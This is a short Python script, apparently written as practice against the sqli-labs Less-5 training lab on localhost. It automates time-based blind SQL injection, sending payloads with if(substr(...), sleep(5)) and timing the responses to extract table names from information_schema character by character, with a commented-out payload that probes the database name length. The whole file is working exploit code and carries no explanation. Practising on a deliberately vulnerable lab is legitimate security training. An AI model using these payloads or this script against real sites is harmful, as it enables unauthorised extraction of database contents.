import requests
import time
# 时间注入能行
url = "http://127.0.0.1/sqli-labs-master/Less-5/"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1, 10):
    for j in dict:
        payload = f"?id=1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'security\' limit 0,1),{i},1)=\"{j}\",sleep(5),0)--+"
        # ?id=1' and if(length(database())=8,sleep(5),1)--+
        gloal = url + payload
        start = time.time()
        res = requests.get(url=gloal)
        end = time.time()
        if end - start > 4.9:
            flag += j
            print(flag)
            break
